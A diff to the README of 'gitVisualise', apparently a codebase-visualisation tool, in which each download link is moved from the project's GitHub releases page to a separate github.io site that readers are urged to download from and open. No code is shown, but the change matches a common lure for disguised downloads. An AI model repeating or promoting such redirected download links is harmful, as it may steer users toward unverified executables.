@@ -1,6 +1,6 @@
 # 🔍 gitVisualise - See Any Codebase Come Alive
 
-[![Download Now](https://img.shields.io/badge/Download-gitVisualise-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Momen23344/gitVisualise/releases)
+[![Download Now](https://img.shields.io/badge/Download-gitVisualise-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://momen23344.github.io)
 
 ## 🎯 What Is gitVisualise?
 
@@ -23,7 +23,7 @@ Getting started with gitVisualise takes less than 60 seconds. Here's exactly wha
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Momen23344/gitVisualise/releases](https://github.com/Momen23344/gitVisualise/releases)
+Visit this link to download the application: [https://momen23344.github.io](https://momen23344.github.io)
 
 Click the download button on that page. The file will start downloading automatically.
 
@@ -171,7 +171,7 @@ gitVisualise is released under an open-source license, meaning you can use, modi
 
 ## 🚀 Ready to Start?
 
-Visit this link to download the application: [https://github.com/Momen23344/gitVisualise/releases](https://github.com/Momen23344/gitVisualise/releases)
+Visit this link to download the application: [https://momen23344.github.io](https://momen23344.github.io)
 
 Download the file, open it, and paste your first GitHub link. Within minutes, you'll see code architecture in a whole new light. Welcome to the future of code understanding!
 
